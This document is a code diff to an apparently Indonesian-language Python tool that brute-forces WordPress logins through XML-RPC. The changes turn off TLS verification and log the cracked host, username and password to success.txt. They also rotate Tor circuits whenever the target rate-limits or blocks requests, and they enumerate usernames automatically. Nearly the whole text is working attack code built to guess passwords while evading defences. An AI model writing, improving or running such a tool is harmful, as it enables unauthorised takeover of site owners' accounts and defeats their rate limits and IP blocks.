@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os
+import sys
 import random
 import time
 import requests
@@ -8,6 +9,10 @@ import threading
 from stem import Signal
 from stem.control import Controller
 from termcolor import colored
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 
 # =========================== CONFIG ===========================
 tor_proxy = {
@@ -24,6 +29,8 @@ user_agents = [
     "curl/8.14.1"
 ]
 # ===============================================================
+sys.stdout.write("\x1b]2;Ghost-RPC MODE - By Official Marz57\x07")
+sys.stdout.flush()
 
 def clear_screen():
     os.system("clear")
@@ -234,7 +241,12 @@ def try_batch_multicall(s, url, username, batch):
                 if "isAdmin" in response or "blogid" in response:
                     print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                     with open("success.txt", "a") as out:
-                        out.write(f"{username}:{pwd}\n")
+                        out.write("----------------------------------------------\n")
+                        out.write(f"host     : {url}\n")
+                        out.write(f"username : {username}\n")
+                        out.write(f"password : {pwd}\n")
+                        out.write("----------------------------------------------\n\n")
+
                     return True
         else:
             print(colored(f"[!] Status HTTP {r.status_code}", 'yellow'))
@@ -246,16 +258,23 @@ def try_single(s, url, username, password):
     headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
     xml = single_payload(username, password)
     try:
-        r = s.post(url, data=xml, headers=headers, timeout=15)
+        # TAMBAHKAN verify=False DI SINI JUGA
+        r = s.post(url, data=xml, headers=headers, timeout=15, verify=False)
         print(f"🔍 {username}:{password}")
         if "isAdmin" in r.text or "blogid" in r.text:
             print(colored(f"[+] Berhasil: {username}:{password}", 'green'))
             with open("success.txt", "a") as out:
-                out.write(f"{username}:{password}\n")
+                out.write("----------------------------------------------\n")
+                out.write(f"host     : {url}\n")
+                out.write(f"username : {username}\n")
+                out.write(f"password : {password}\n")
+                out.write("----------------------------------------------\n\n")
+
             return True
     except Exception as e:
         print(colored(f"[!] Error: {e}", 'red'))
     return False
+
 
 
 
@@ -310,8 +329,26 @@ def run_bruteforce(url, use_tor, target_usernames):
     with open(wordlist_path, 'r') as f:
         passwords = [line.strip() for line in f if line.strip()]
 
+    # Validasi awal jalur TOR sebelum menyerang
+    if use_tor:
+        print(colored("[*] Memvalidasi kestabilan jalur TOR ke target sebelum memulai...", "yellow"))
+        init_ready = False
+        while not init_ready:
+            check_s = session(use_tor)
+            try:
+                r_test = check_s.head(url, timeout=7, verify=False)
+                if r_test.status_code:
+                    init_ready = True
+                    check_s.close()
+            except:
+                check_s.close()
+                print(colored(f"[!] IP Awal [{current_ip}] memblokir target. Mencari sirkuit TOR baru...", "red"))
+                if renew_tor_ip():
+                    time.sleep(4)
+                    current_ip = get_ip(use_tor)
+        print(colored(f"🌐 [JALUR AMAN] Siap menyerang dengan IP: {current_ip}", "green"))
+
     print(colored(f"\n[*] Menjalankan serangan ke {url}...", "yellow"))
-    
     s = session(use_tor)
     success_flag = False
 
@@ -326,85 +363,160 @@ def run_bruteforce(url, use_tor, target_usernames):
                 batch = passwords[i:i+batch_size]
                 current_batch_num = (i // batch_size) + 1
                 
-                print(colored(f"\n🔁 Batch {current_batch_num} | User: {username} | [IP Saat Ini: {current_ip}]", "cyan"))
+                print(colored(f"🔁 Batch {current_batch_num} | User: {username} | [IP Saat Ini: {current_ip}]", "cyan"))
                 
-                if try_batch_multicall(s, url, username, batch):
-                    success_flag = True
-                    break
+                headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
+                xml = build_multicall_payload(username, batch)
+                need_rotation = False
                 
-                if use_tor and (current_batch_num % 3 == 0):
-                    print(colored(f"\n⚠️  [TOR] Batas 3 batch tercapai! Mencoba mengganti IP lama [{current_ip}]...", "yellow"))
-                    if renew_tor_ip():
-                        s.close()
-                        
-                        # ANIMASI COUNTDOWN 3 DETIK (MODE MULTICALL)
-                        for remaining in range(3, 0, -1):
-                            print(f"\r[*] Sirkuit TOR baru diminta. Sinkronisasi dalam {remaining} detik...", end="", flush=True)
-                            time.sleep(1)
-                        print("\r" + " " * 80 + "\r", end="", flush=True) # Bersihkan baris countdown
-                        
-                        s = session(use_tor)
-                        new_ip = get_ip(use_tor)
-                        print(colored(f"🌐 [TOR SUCCESS] IP berhasil diganti: {current_ip} ➡️  {new_ip}", "green"))
-                        current_ip = new_ip
+                try:
+                    r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
+                    if r.status_code == 200:
+                        responses = r.text.split('<struct>')[1:] if "<struct>" in r.text else [r.text]
+                        for pwd, response in zip(batch, responses):
+                            print(f"🔍 {username}:{pwd}")
+                            if "isAdmin" in response or "blogid" in response:
+                                print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
+                                with open("success.txt", "a") as out:
+                                    out.write("----------------------------------------------\n")
+                                    out.write(f"host     : {url}\n")
+                                    out.write(f"username : {username}\n")
+                                    out.write(f"password : {pwd}\n")
+                                    out.write("----------------------------------------------\n\n")
+                                success_flag = True
+                                break
+                        if success_flag: break
+                    elif r.status_code == 429:
+                        print(colored("[!] Server menerapkan Rate Limit (HTTP 429).", "yellow"))
+                        need_rotation = True
                     else:
-                        print(colored("[!] Gagal memutar IP TOR. Melanjutkan dengan IP...", "red"))
+                        print(colored(f"[!] Server merespon HTTP {r.status_code}", "yellow"))
+                except Exception as e:
+                    print(colored("[!] Koneksi terputus/terblokir oleh target.", "red"))
+                    need_rotation = True
                 
-                time.sleep(random.uniform(1.5, 4.0))
-                
-        elif mode == "single":
-            stop_event = threading.Event()
-            lock = threading.Lock()
-            
-            def worker(pwd):
-                if stop_event.is_set(): return
-                if try_single(s, url, username, pwd):
-                    with lock:
-                        stop_event.set()
-                        nonlocal success_flag
-                        success_flag = True
-                time.sleep(random.uniform(1.5, 4.0))
-
-            threads_list = []
-            window_count = 0
-            
-            for pwd in passwords:
-                if stop_event.is_set(): break
-                t = threading.Thread(target=worker, args=(pwd,))
-                threads_list.append(t)
-                t.start()
-                
-                if len(threads_list) >= threads:
-                    window_count += 1
-                    print(colored(f"\n🚀 Menjalankan Thread Window {window_count} | [IP Saat Ini: {current_ip}]", "cyan"))
-                    for x in threads_list: x.join()
-                    threads_list.clear()
-                    
-                    if use_tor:
-                        print(colored(f"\n⚠️  [TOR] Window selesai! Mengganti sirkuit IP [{current_ip}]...", "yellow"))
+                if use_tor and need_rotation:
+                    print(colored(f"\n⚠️  [TOR ROTATION] Memicu pergantian IP lama [{current_ip}]...", "yellow"))
+                    tor_ready = False
+                    while not tor_ready:
                         if renew_tor_ip():
                             s.close()
-                            
-                            # ANIMASI COUNTDOWN 3 DETIK (MODE SINGLE)
-                            for remaining in range(3, 0, -1):
-                                print(f"\r[*] Sirkuit baru diminta. Sinkronisasi dalam {remaining} detik...", end="", flush=True)
-                                time.sleep(1)
-                            print("\r" + " " * 80 + "\r", end="", flush=True) # Bersihkan baris countdown
-                            
-                            s = session(use_tor)
-                            new_ip = get_ip(use_tor)
-                            print(colored(f"🌐 [TOR SUCCESS] IP Berubah: {current_ip} ➡️  {new_ip}", "green"))
-                            current_ip = new_ip
-                        else:
-                            print(colored("[!] Gagal memutar IP TOR. Lanjut...", "red"))
+                            print(colored("[*] Sirkuit TOR diperbarui. Memvalidasi kestabilan HTTPS ke target...", "yellow"))
+                            for retry in range(3):
+                                time.sleep(2)
+                                check_s = session(use_tor)
+                                try:
+                                    r_test = check_s.head(url, timeout=6, verify=False)
+                                    if r_test.status_code: 
+                                        current_ip = get_ip(use_tor)
+                                        tor_ready = True
+                                        check_s.close()
+                                        break
+                                except:
+                                    check_s.close()
+                            if tor_ready: break
+                        time.sleep(3)
+                    s = session(use_tor)
+                    print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}", "green"))
+                
+                time.sleep(random.uniform(1.0, 2.5))
 
-            for x in threads_list: x.join()
+
+
+
+
+
+
+#-------------------- bagian 4-B-----------------#
+
+
+
+
+        elif mode == "single":
+            idx = 0
+            while idx < len(passwords):
+                if success_flag: break
+                
+                batch_pwds = passwords[idx:idx+threads]
+                window_count = (idx // threads) + 1
+                print(colored(f"\n🚀 Menjalankan Thread Window {window_count} | [IP Saat Ini: {current_ip}]", "cyan"))
+                
+                stop_event = threading.Event()
+                lock = threading.Lock()
+                errors_detected = []
+                
+                def worker(pwd):
+                    if stop_event.is_set(): return
+                    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
+                    xml = single_payload(username, pwd)
+                    try:
+                        r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
+                        if r.status_code == 200:
+                            print(f"🔍 {username}:{pwd}")
+                            if "isAdmin" in r.text or "blogid" in r.text:
+                                with lock:
+                                    print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
+                                    with open("success.txt", "a") as out:
+                                        out.write("----------------------------------------------\n")
+                                        out.write(f"host     : {url}\n")
+                                        out.write(f"username : {username}\n")
+                                        out.write(f"password : {pwd}\n")
+                                        out.write("----------------------------------------------\n\n")
+                                    stop_event.set()
+                                    nonlocal success_flag
+                                    success_flag = True
+                        elif r.status_code == 429:
+                            with lock: errors_detected.append("rate_limit")
+                        else:
+                            print(f"🔍 {username}:{pwd} -> HTTP {r.status_code}")
+                    except:
+                        with lock: errors_detected.append("blocked")
+                    time.sleep(random.uniform(1.0, 2.0))
+
+                threads_list = []
+                for pwd in batch_pwds:
+                    t = threading.Thread(target=worker, args=(pwd,))
+                    threads_list.append(t)
+                    t.start()
+                
+                for x in threads_list: x.join()
+                
+                if use_tor and errors_detected:
+                    print(colored(f"\n⚠️  [TOR ROTATION] Terdeteksi eror/blokir pada window ini. Mengganti sirkuit [{current_ip}]...", "yellow"))
+                    tor_ready = False
+                    while not tor_ready:
+                        if renew_tor_ip():
+                            s.close()
+                            print(colored("[*] Sirkuit TOR diperbarui. Memvalidasi kestabilan HTTPS ke target...", "yellow"))
+                            for retry in range(3):
+                                time.sleep(2)
+                                check_s = session(use_tor)
+                                try:
+                                    r_test = check_s.head(url, timeout=6, verify=False)
+                                    if r_test.status_code:
+                                        current_ip = get_ip(use_tor)
+                                        tor_ready = True
+                                        check_s.close()
+                                        break
+                                except:
+                                    check_s.close()
+                            if tor_ready: break
+                        time.sleep(3)
+                    s = session(use_tor)
+                    print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}", "green"))
+                    print(colored("[*] Mengulang kembali pengecekan password yang sempat gagal...", "yellow"))
+                else:
+                    idx += threads
 
     if success_flag:
         print(colored("\n[+] Bruteforce Sukses! Hasil tersimpan di success.txt", "green"))
     else:
         print(colored("\n[-] Bruteforce Selesai! Tidak ada password yang cocok.", "red"))
     input("\nTekan ENTER untuk kembali...")
+
+
+
+
 
 
 
@@ -438,10 +550,30 @@ def tor_menu():
         print(colored(f"🌐 IP TOR: {get_ip(True)}", "cyan"))
         input("\nTekan ENTER untuk kembali...")
 
+def format_target_url(raw_url):
+    """Otomatis memformat input agar selalu berujung pada /xmlrpc.php"""
+    url = raw_url.strip()
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    
+    # Hapus tanda slash di paling belakang jika ada
+    if url.endswith("/"):
+        url = url[:-1]
+        
+    # Jika user belum mengetik xmlrpc.php, tambahkan otomatis
+    if not url.endswith("xmlrpc.php"):
+        if url.endswith("xmlrpc"):
+            url = url + ".php"
+        else:
+            url = url + "/xmlrpc.php"
+    return url
+
 def main_menu(initial_url):
-    url = initial_url
+    # Otomatis rapikan URL di awal start CLI
+    url = format_target_url(initial_url)
     use_tor = False
     
+    print(colored(f"[*] Menghubungkan ke target: {url}", "cyan"))
     print(colored("[*] Mencoba memindai username target secara otomatis...", "yellow"))
     target_usernames = scan_wp_usernames(url, use_tor)
     
@@ -507,10 +639,8 @@ def main_menu(initial_url):
             print_logo()
             new_target = input("Masukkan Target URL baru: ").strip()
             if new_target:
-                if not new_target.startswith(("http://", "https://")):
-                    new_target = "https://" + new_target
-                url = new_target
-                print(colored("[*] Memindai username pada target baru...", "yellow"))
+                url = format_target_url(new_target)
+                print(colored(f"[*] Memindai username pada target baru: {url}", "yellow"))
                 target_usernames = scan_wp_usernames(url, use_tor)
             input("\nTekan ENTER untuk kembali...")
         elif choice == "9":
@@ -532,11 +662,9 @@ def main_menu(initial_url):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="WordPress XML-RPC Audit & Bruteforce Tool")
-    parser.add_argument("-u", "--url", required=True, help="Target XML-RPC URL")
+    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. example.com atau example.com/xmlrpc.php)")
     args = parser.parse_args()
 
-    target = args.url.strip()
-    if not target.startswith(("http://", "https://")):
-        target = "https://" + target
+    # Memanggil main menu dengan pembersihan URL otomatis sejak argument CLI masuk
+    main_menu(args.url)
 
-    main_menu(target)
